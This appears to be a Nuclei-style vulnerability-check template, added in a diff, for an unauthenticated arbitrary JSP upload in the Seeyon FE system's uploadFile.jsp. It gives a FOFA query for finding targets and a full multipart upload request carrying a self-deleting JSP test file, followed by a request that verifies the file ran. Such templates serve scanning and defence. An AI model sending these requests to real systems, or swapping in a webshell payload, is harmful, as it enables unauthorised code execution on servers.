@@ -1,0 +1,42 @@
+id: seeyon-fe-uploadfile-upload
+
+info:
+  name: "致远互联 FE 系统 uploadFile.jsp 组件任意文件上传"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="li_plugins_download"||app="致远互联-FE"
+      reference: https://example.com/cve-2024-xxxx
+      该漏洞允许攻击者通过构造恶意文件上传请求，在目标系统中部署可执行代码文件。由于uploadFile.jsp组件未正确校验上传文件类型与路径，导致攻击者可绕过安全限制上传WebShell，最终实现对目标系统的远程控制。受影响组件存在于致远互联FE系统的默认部署路径中，通过特定参数即可触发未经身份验证的远程代码执行。
+  tags: 致远互联
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /common/uploadFile.jsp?action=save&savePath=/images/upload/&fileName=hjchxm.jpg&title1=%C9%CF%B4%AB%CE%C4%BC%FE&title2=%D1%A1%D4%F1%CE%C4%BC%FE&allowsize=null&extName=.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylBU670lIdrGgVSWG
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+
+    ------WebKitFormBoundarylBU670lIdrGgVSWG
+    Content-Disposition: form-data; name="accessory"; filename="NTest.jsp"
+    Content-Type: application/octet-stream
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundarylBU670lIdrGgVSWG--
+- raw:
+  - |
+    GET /images/upload/NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
